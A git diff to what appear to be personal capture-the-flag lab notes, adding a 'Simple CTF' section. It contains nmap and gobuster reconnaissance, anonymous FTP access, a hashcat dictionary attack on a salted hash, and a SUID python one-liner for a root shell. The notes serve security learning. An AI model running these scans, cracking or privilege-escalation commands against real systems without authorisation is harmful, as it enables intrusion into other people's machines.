@@ -40,7 +40,7 @@ ssh -i kay_id_rsa {user name}@{target IP}
 ```bash
 nmap -sC -sV -oN nmap.log {target IP}
 nikto -h http://{target IP} | tee nikto.log
-gobuster dir -u http://10.10.131.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u {target IP} -x php,sh,txt,cgi,html,js,css,py
 ```
 
 ```bash
@@ -89,4 +89,27 @@ find / -user root -perm /4000 -type f 2>/dev/null
 # escalate the priviledge
 # ref) https://gtfobins.github.io/gtfobins/python/#suid
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+## Simple CTF
+
+```bash
+# stealth scan
+sudo nmap -sS -sV -oN nmap.log {target IP}
+```
+
+- CVE: Common Vulnerabilities and Exposures
+
+```bash
+ftp {target IP}
+# Name: anonymous
+
+# execute the script from Exploit DB site
+# and get password hash
+
+# anylyze password from pw hash
+# -O: optimized-kernel-enable (limit length of password)
+# -a: attack-mode: 0 = Straight
+# -m: hash type ... 10, 20, ... (https://hashcat.net/wiki/doku.php?id=example_hashes)
+hashcat -O -a 0 -m 20 {pw hash}:{salt} /usr/share/wordlists/rockyou.txt
 ```
